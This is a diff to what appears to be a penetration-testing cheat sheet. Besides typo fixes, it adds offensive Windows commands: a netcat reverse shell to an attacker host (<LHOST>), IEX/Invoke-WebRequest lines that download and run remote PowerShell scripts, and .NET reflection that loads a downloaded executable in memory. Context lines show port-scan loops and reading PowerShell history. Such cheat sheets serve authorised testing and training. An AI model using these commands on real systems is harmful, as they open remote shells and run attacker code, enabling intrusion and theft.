@@ -966,7 +966,7 @@ for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
-#### rpclient
+#### rpcclient
 
 ```c
 $ rpcclient -U "" <RHOST>
@@ -3720,7 +3720,7 @@ powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ##### Import Module to PowerShell cmdlet
 
 ```c
-import-module ./<module / powershell script>
+Import-Module .\<FILE>
 ```
 
 ##### Check PowerShell Versions
@@ -3737,10 +3737,38 @@ powershell -c "[Environment]::Is64BitProcess"
 type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-##### Create a .zip-File
+##### Create a .zip File
 
 ```c
 Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
+```
+
+##### Unzip a File
+
+```c
+Expand-Archive -Force <FILE>.zip
+```
+
+##### Start a new Process
+
+```c
+Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
+```
+
+##### Invoke-Expression / Invoke-WebRequest
+
+```c
+IEX(IWR http://<LHOST>/<FILE>.ps1)
+Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
+```
+
+##### .NET Reflection
+
+```c
+$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+$entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
 ```
 
 ##### Start offsec Session
